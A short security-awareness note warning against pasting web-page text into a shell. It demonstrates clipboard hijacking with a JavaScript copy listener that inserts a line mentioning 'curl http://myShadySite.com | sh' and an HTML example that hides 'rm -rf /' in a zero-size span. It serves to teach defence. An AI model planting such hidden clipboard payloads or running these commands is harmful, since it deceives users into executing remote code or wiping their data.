# Do not Copy-paste into a Shell

Modern web API (including CSS!) can modify what is written into the clipboard through an event listener. The compromised content could even contain a newline character that execute the code.

Example in JavaScript

```javascript
document.getElementById('copyme').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain',
        'echo "this could have been [curl http://myShadySite.com | sh]"\n'
    );
    e.preventDefault();
});
```

Example with CSS

```html
echo <span style="font-size: 0;">; rm -rf / ; echo </span> "looks safe to me!"
```
